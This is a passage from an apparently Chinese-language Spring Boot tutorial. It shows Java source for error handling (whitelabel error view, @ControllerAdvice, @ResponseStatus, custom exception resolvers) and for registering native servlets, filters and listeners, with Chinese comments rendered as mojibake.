resolve the view name.</span><br>            <span class="hljs-comment">//æ‰¾å‡ºåˆé€‚errorçš„Viewï¼Œå¦‚æœ/template/errorå†…æ²¡æœ‰4**.htmlæˆ–5**.htmlï¼Œ</span><br>            <span class="hljs-comment">//å°†ä¼šè¿”å›é»˜è®¤å¼‚å¸¸é¡µé¢ErrorMvcAutoConfiguration.StaticView</span><br>            <span class="hljs-comment">//è¿™é‡ŒæŒ‰éœ€æ·±ç©¶ä»£ç å§ï¼</span><br>view = resolveViewName(viewName, mv.getModelInternal(), locale, request);<br>...<br>&#125;<br>...<br><span class="hljs-keyword">try</span> &#123;<br><span class="hljs-keyword">if</span> (mv.getStatus() != <span class="hljs-literal">null</span>) &#123;<br>response.setStatus(mv.getStatus().value());<br>&#125;<br>            <span class="hljs-comment">//çœ‹ä¸‹é¢ä»£ç å—çš„StaticViewçš„renderå—</span><br>view.render(mv.getModelInternal(), request, response);<br>&#125;<br><span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>...<br>&#125;<br>&#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnWebApplication(type = Type.SERVLET)</span><br><span class="hljs-meta">@ConditionalOnClass(&#123; Servlet.class, DispatcherServlet.class &#125;)</span><br><span class="hljs-comment">// Load before the main WebMvcAutoConfiguration so that the error View is available</span><br><span class="hljs-meta">@AutoConfigureBefore(WebMvcAutoConfiguration.class)</span><br><span class="hljs-meta">@EnableConfigurationProperties(&#123; ServerProperties.class, ResourceProperties.class, WebMvcProperties.class &#125;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ErrorMvcAutoConfiguration</span> &#123;<br>    <br>    ...<br>        <br>   <span class="hljs-meta">@Configuration(proxyBeanMethods = false)</span><br><span class="hljs-meta">@ConditionalOnProperty(prefix = &quot;server.error.whitelabel&quot;, name = &quot;enabled&quot;, matchIfMissing = true)</span><br><span class="hljs-meta">@Conditional(ErrorTemplateMissingCondition.class)</span><br><span class="hljs-keyword">protected</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">WhitelabelErrorViewConfiguration</span> &#123;<br><br>        <span class="hljs-comment">//å°†åˆ›å»ºä¸€ä¸ªåä¸ºerrorçš„ç³»ç»Ÿé»˜è®¤å¼‚å¸¸é¡µé¢Viewçš„Bean</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">StaticView</span> <span class="hljs-variable">defaultErrorView</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StaticView</span>();<br><br><span class="hljs-meta">@Bean(name = &quot;error&quot;)</span><br><span class="hljs-meta">@ConditionalOnMissingBean(name = &quot;error&quot;)</span><br><span class="hljs-keyword">public</span> View <span class="hljs-title function_">defaultErrorView</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-built_in">this</span>.defaultErrorView;<br>&#125;<br><br><span class="hljs-comment">// If the user adds @EnableWebMvc then the bean name view resolver from</span><br><span class="hljs-comment">// WebMvcAutoConfiguration disappears, so add it back in to avoid disappointment.</span><br><span class="hljs-meta">@Bean</span><br><span class="hljs-meta">@ConditionalOnMissingBean</span><br><span class="hljs-keyword">public</span> BeanNameViewResolver <span class="hljs-title function_">beanNameViewResolver</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-type">BeanNameViewResolver</span> <span class="hljs-variable">resolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanNameViewResolver</span>();<br>resolver.setOrder(Ordered.LOWEST_PRECEDENCE - <span class="hljs-number">10</span>);<br><span class="hljs-keyword">return</span> resolver;<br>&#125;<br><br>&#125;     <br>   <br>    <br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">StaticView</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">View</span> &#123;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">MediaType</span> <span class="hljs-variable">TEXT_HTML_UTF8</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MediaType</span>(<span class="hljs-string">&quot;text&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, StandardCharsets.UTF_8);<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Log</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogFactory.getLog(StaticView.class);<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">render</span><span class="hljs-params">(Map&lt;String, ?&gt; model, HttpServletRequest request, HttpServletResponse response)</span><br><span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-keyword">if</span> (response.isCommitted()) &#123;<br><span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> getMessage(model);<br>logger.error(message);<br><span class="hljs-keyword">return</span>;<br>&#125;<br>response.setContentType(TEXT_HTML_UTF8.toString());<br><span class="hljs-type">StringBuilder</span> <span class="hljs-variable">builder</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuilder</span>();<br><span class="hljs-type">Object</span> <span class="hljs-variable">timestamp</span> <span class="hljs-operator">=</span> model.get(<span class="hljs-string">&quot;timestamp&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> model.get(<span class="hljs-string">&quot;message&quot;</span>);<br><span class="hljs-type">Object</span> <span class="hljs-variable">trace</span> <span class="hljs-operator">=</span> model.get(<span class="hljs-string">&quot;trace&quot;</span>);<br><span class="hljs-keyword">if</span> (response.getContentType() == <span class="hljs-literal">null</span>) &#123;<br>response.setContentType(getContentType());<br>&#125;<br>            <span class="hljs-comment">//ç³»ç»Ÿé»˜è®¤å¼‚å¸¸é¡µé¢htmlä»£ç </span><br>builder.append(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&lt;h1&gt;Whitelabel Error Page&lt;/h1&gt;&quot;</span>).append(<br><span class="hljs-string">&quot;&lt;p&gt;This application has no explicit mapping for /error, so you are seeing this as a fallback.&lt;/p&gt;&quot;</span>)<br>.append(<span class="hljs-string">&quot;&lt;div id=&#x27;created&#x27;&gt;&quot;</span>).append(timestamp).append(<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>)<br>.append(<span class="hljs-string">&quot;&lt;div&gt;There was an unexpected error (type=&quot;</span>).append(htmlEscape(model.get(<span class="hljs-string">&quot;error&quot;</span>)))<br>.append(<span class="hljs-string">&quot;, status=&quot;</span>).append(htmlEscape(model.get(<span class="hljs-string">&quot;status&quot;</span>))).append(<span class="hljs-string">&quot;).&lt;/div&gt;&quot;</span>);<br><span class="hljs-keyword">if</span> (message != <span class="hljs-literal">null</span>) &#123;<br>builder.append(<span class="hljs-string">&quot;&lt;div&gt;&quot;</span>).append(htmlEscape(message)).append(<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (trace != <span class="hljs-literal">null</span>) &#123;<br>builder.append(<span class="hljs-string">&quot;&lt;div style=&#x27;white-space:pre-wrap;&#x27;&gt;&quot;</span>).append(htmlEscape(trace)).append(<span class="hljs-string">&quot;&lt;/div&gt;&quot;</span>);<br>&#125;<br>builder.append(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>response.getWriter().append(builder.toString());<br>&#125;<br><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">htmlEscape</span><span class="hljs-params">(Object input)</span> &#123;<br><span class="hljs-keyword">return</span> (input != <span class="hljs-literal">null</span>) ? HtmlUtils.htmlEscape(input.toString()) : <span class="hljs-literal">null</span>;<br>&#125;<br><br><span class="hljs-keyword">private</span> String <span class="hljs-title function_">getMessage</span><span class="hljs-params">(Map&lt;String, ?&gt; model)</span> &#123;<br><span class="hljs-type">Object</span> <span class="hljs-variable">path</span> <span class="hljs-operator">=</span> model.get(<span class="hljs-string">&quot;path&quot;</span>);<br><span class="hljs-type">String</span> <span class="hljs-variable">message</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;Cannot render error page for request [&quot;</span> + path + <span class="hljs-string">&quot;]&quot;</span>;<br><span class="hljs-keyword">if</span> (model.get(<span class="hljs-string">&quot;message&quot;</span>) != <span class="hljs-literal">null</span>) &#123;<br>message += <span class="hljs-string">&quot; and exception [&quot;</span> + model.get(<span class="hljs-string">&quot;message&quot;</span>) + <span class="hljs-string">&quot;]&quot;</span>;<br>&#125;<br>message += <span class="hljs-string">&quot; as the response has already been committed.&quot;</span>;<br>message += <span class="hljs-string">&quot; As a result, the response may have the wrong status code.&quot;</span>;<br><span class="hljs-keyword">return</span> message;<br>&#125;<br><br><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> String <span class="hljs-title function_">getContentType</span><span class="hljs-params">()</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;text/html&quot;</span>;<br>&#125;<br><br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="55ã€é”™è¯¯å¤„ç†-ã€æºç æµç¨‹ã€‘å‡ ç§å¼‚å¸¸å¤„ç†åŸç†"><a href="#55ã€é”™è¯¯å¤„ç†-ã€æºç æµç¨‹ã€‘å‡ ç§å¼‚å¸¸å¤„ç†åŸç†" class="headerlink" title="55ã€é”™è¯¯å¤„ç†-ã€æºç æµç¨‹ã€‘å‡ ç§å¼‚å¸¸å¤„ç†åŸç†"></a>55ã€é”™è¯¯å¤„ç†-ã€æºç æµç¨‹ã€‘å‡ ç§å¼‚å¸¸å¤„ç†åŸç†</h2><ul><li><p>è‡ªå®šä¹‰é”™è¯¯é¡µ</p><ul><li>error&#x2F;404.html   error&#x2F;5xx.htmlï¼›æœ‰ç²¾ç¡®çš„é”™è¯¯çŠ¶æ€ç é¡µé¢å°±åŒ¹é…ç²¾ç¡®ï¼Œæ²¡æœ‰å°±æ‰¾ 4xx.htmlï¼›å¦‚æœéƒ½æ²¡æœ‰å°±è§¦å‘ç™½é¡µ</li></ul></li><li><p><code>@ControllerAdvice</code>+<code>@ExceptionHandler</code>å¤„ç†å…¨å±€å¼‚å¸¸ï¼›åº•å±‚æ˜¯ <code>ExceptionHandlerExceptionResolver</code> æ”¯æŒçš„</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@ControllerAdvice</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">GlobalExceptionHandler</span> &#123;<br><br>    <span class="hljs-meta">@ExceptionHandler(&#123;ArithmeticException.class,NullPointerException.class&#125;)</span>  <span class="hljs-comment">//å¤„ç†å¼‚å¸¸</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">handleArithException</span><span class="hljs-params">(Exception e)</span>&#123;<br><br>        log.error(<span class="hljs-string">&quot;å¼‚å¸¸æ˜¯ï¼š&#123;&#125;&quot;</span>,e);<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;login&quot;</span>; <span class="hljs-comment">//è§†å›¾åœ°å€</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>@ResponseStatus</code>+è‡ªå®šä¹‰å¼‚å¸¸ ï¼›åº•å±‚æ˜¯ <code>ResponseStatusExceptionResolver</code> ï¼ŒæŠŠresponseStatusæ³¨è§£çš„ä¿¡æ¯åº•å±‚è°ƒç”¨ <code>response.sendError(statusCode, resolvedReason)</code>ï¼Œtomcatå‘é€çš„<code>/error</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@ResponseStatus(value= HttpStatus.FORBIDDEN,reason = &quot;ç”¨æˆ·æ•°é‡å¤ªå¤š&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">UserTooManyException</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">RuntimeException</span> &#123;<br><br>    <span class="hljs-keyword">public</span>  <span class="hljs-title function_">UserTooManyException</span><span class="hljs-params">()</span>&#123;<br><br>    &#125;<br>    <span class="hljs-keyword">public</span>  <span class="hljs-title function_">UserTooManyException</span><span class="hljs-params">(String message)</span>&#123;<br>        <span class="hljs-built_in">super</span>(message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TableController</span> &#123;<br>    <br><span class="hljs-meta">@GetMapping(&quot;/dynamic_table&quot;)</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">dynamic_table</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(value=&quot;pn&quot;,defaultValue = &quot;1&quot;)</span> Integer pn,Model model)</span>&#123;<br>        <span class="hljs-comment">//è¡¨æ ¼å†…å®¹çš„éå†</span><br>     List&lt;User&gt; users = Arrays.asList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;zhangsan&quot;</span>, <span class="hljs-string">&quot;123456&quot;</span>),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;lisi&quot;</span>, <span class="hljs-string">&quot;123444&quot;</span>),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;haha&quot;</span>, <span class="hljs-string">&quot;aaaaa&quot;</span>),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">&quot;hehe &quot;</span>, <span class="hljs-string">&quot;aaddd&quot;</span>));<br>        model.addAttribute(<span class="hljs-string">&quot;users&quot;</span>,users);<br><br>        <span class="hljs-keyword">if</span>(users.size()&gt;<span class="hljs-number">3</span>)&#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">UserTooManyException</span>();<span class="hljs-comment">//æŠ›å‡ºè‡ªå®šä¹‰å¼‚å¸¸</span><br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;table/dynamic_table&quot;</span>;<br>    &#125;<br>    <br>&#125;<br></code></pre></td></tr></table></figure><ul><li><p>Springè‡ªå®¶å¼‚å¸¸å¦‚ <code> org.springframework.web.bind.MissingServletRequestParameterException</code>ï¼Œ<code>DefaultHandlerExceptionResolver</code> å¤„ç†Springè‡ªå®¶å¼‚å¸¸ã€‚</p></li><li><ul><li><code>response.sendError(HttpServletResponse.SC_BAD_REQUEST/*400*/, ex.getMessage());</code></li></ul></li><li><p>è‡ªå®šä¹‰å®ç° <code>HandlerExceptionResolver</code> å¤„ç†å¼‚å¸¸ï¼›å¯ä»¥ä½œä¸ºé»˜è®¤çš„å…¨å±€å¼‚å¸¸å¤„ç†è§„åˆ™</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Order(value= Ordered.HIGHEST_PRECEDENCE)</span>  <span class="hljs-comment">//ä¼˜å…ˆçº§ï¼Œæ•°å­—è¶Šå°ä¼˜å…ˆçº§è¶Šé«˜</span><br><span class="hljs-meta">@Component</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CustomerHandlerExceptionResolver</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">HandlerExceptionResolver</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">resolveException</span><span class="hljs-params">(HttpServletRequest request,</span><br><span class="hljs-params">                                         HttpServletResponse response,</span><br><span class="hljs-params">                                         Object handler, Exception ex)</span> &#123;<br><br>        <span class="hljs-keyword">try</span> &#123;<br>            response.sendError(<span class="hljs-number">511</span>,<span class="hljs-string">&quot;æˆ‘å–œæ¬¢çš„é”™è¯¯&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>ErrorViewResolver</code>  å®ç°è‡ªå®šä¹‰å¤„ç†å¼‚å¸¸<ul><li><code>response.sendError()</code>ï¼Œerrorè¯·æ±‚å°±ä¼šè½¬ç»™controllerã€‚</li><li>ä½ çš„å¼‚å¸¸æ²¡æœ‰ä»»ä½•äººèƒ½å¤„ç†ï¼Œtomcatåº•å±‚è°ƒç”¨<code>response.sendError()</code>ï¼Œerrorè¯·æ±‚å°±ä¼šè½¬ç»™controllerã€‚</li><li><code>basicErrorController</code> è¦å»çš„é¡µé¢åœ°å€æ˜¯ <code>ErrorViewResolver</code>  ã€‚</li></ul></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><br><span class="hljs-meta">@RequestMapping(&quot;$&#123;server.error.path:$&#123;error.path:/error&#125;&#125;&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BasicErrorController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">AbstractErrorController</span> &#123;<br><br>    ...<br>    <br><span class="hljs-meta">@RequestMapping(produces = MediaType.TEXT_HTML_VALUE)</span><br><span class="hljs-keyword">public</span> ModelAndView <span class="hljs-title function_">errorHtml</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;<br><span class="hljs-type">HttpStatus</span> <span class="hljs-variable">status</span> <span class="hljs-operator">=</span> getStatus(request);<br>Map&lt;String, Object&gt; model = Collections<br>.unmodifiableMap(getErrorAttributes(request, getErrorAttributeOptions(request, MediaType.TEXT_HTML)));<br>response.setStatus(status.value());<br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> resolveErrorView(request, response, status, model);<br><span class="hljs-keyword">return</span> (modelAndView != <span class="hljs-literal">null</span>) ? modelAndView : <span class="hljs-keyword">new</span> <span class="hljs-title class_">ModelAndView</span>(<span class="hljs-string">&quot;error&quot;</span>, model);<br>&#125;<br>    <br>    <span class="hljs-keyword">protected</span> ModelAndView <span class="hljs-title function_">resolveErrorView</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response, HttpStatus status,</span><br><span class="hljs-params">Map&lt;String, Object&gt; model)</span> &#123;<br>        <span class="hljs-comment">//è¿™é‡Œç”¨åˆ°ErrorViewResolveræ¥å£</span><br><span class="hljs-keyword">for</span> (ErrorViewResolver resolver : <span class="hljs-built_in">this</span>.errorViewResolvers) &#123;<br><span class="hljs-type">ModelAndView</span> <span class="hljs-variable">modelAndView</span> <span class="hljs-operator">=</span> resolver.resolveErrorView(request, status, model);<br><span class="hljs-keyword">if</span> (modelAndView != <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">return</span> modelAndView;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>&#125;<br>    <br>    ...<br>    <br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@FunctionalInterface</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">ErrorViewResolver</span> &#123;<br><br>ModelAndView <span class="hljs-title function_">resolveErrorView</span><span class="hljs-params">(HttpServletRequest request, HttpStatus status, Map&lt;String, Object&gt; model)</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="56ã€åŸç”Ÿç»„ä»¶æ³¨å…¥-åŸç”Ÿæ³¨è§£ä¸Springæ–¹å¼æ³¨å…¥"><a href="#56ã€åŸç”Ÿç»„ä»¶æ³¨å…¥-åŸç”Ÿæ³¨è§£ä¸Springæ–¹å¼æ³¨å…¥" class="headerlink" title="56ã€åŸç”Ÿç»„ä»¶æ³¨å…¥-åŸç”Ÿæ³¨è§£ä¸Springæ–¹å¼æ³¨å…¥"></a>56ã€åŸç”Ÿç»„ä»¶æ³¨å…¥-åŸç”Ÿæ³¨è§£ä¸Springæ–¹å¼æ³¨å…¥</h2><p><a href="https://docs.spring.io/spring-boot/docs/2.4.2/reference/htmlsingle/#howto-add-a-servlet-filter-or-listener">å®˜æ–¹æ–‡æ¡£ - Servlets, Filters, and listeners</a></p><h3 id="ä½¿ç”¨åŸç”Ÿçš„æ³¨è§£"><a href="#ä½¿ç”¨åŸç”Ÿçš„æ³¨è§£" class="headerlink" title="ä½¿ç”¨åŸç”Ÿçš„æ³¨è§£"></a>ä½¿ç”¨åŸç”Ÿçš„æ³¨è§£</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@WebServlet(urlPatterns = &quot;/my&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="hljs-keyword">throws</span> ServletException, IOException &#123;<br>        resp.getWriter().write(<span class="hljs-string">&quot;66666&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@WebFilter(urlPatterns=&#123;&quot;/css/*&quot;,&quot;/images/*&quot;&#125;)</span> <span class="hljs-comment">//my</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyFilter</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Filter</span> &#123;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">(FilterConfig filterConfig)</span> <span class="hljs-keyword">throws</span> ServletException &#123;<br>        log.info(<span class="hljs-string">&quot;MyFilteråˆå§‹åŒ–å®Œæˆ&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doFilter</span><span class="hljs-params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        log.info(<span class="hljs-string">&quot;MyFilterå·¥ä½œ&quot;</span>);<br>        chain.doFilter(request,response);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        log.info(<span class="hljs-string">&quot;MyFilteré”€æ¯&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Slf4j</span><br><span class="hljs-meta">@WebListener</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">MyServletContextListener</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ServletContextListener</span> &#123;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextInitialized</span><span class="hljs-params">(ServletContextEvent sce)</span> &#123;<br>        log.info(<span class="hljs-string">&quot;MySwervletContextListenerç›‘å¬åˆ°é¡¹ç›®åˆå§‹åŒ–å®Œæˆ&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">contextDestroyed</span><span 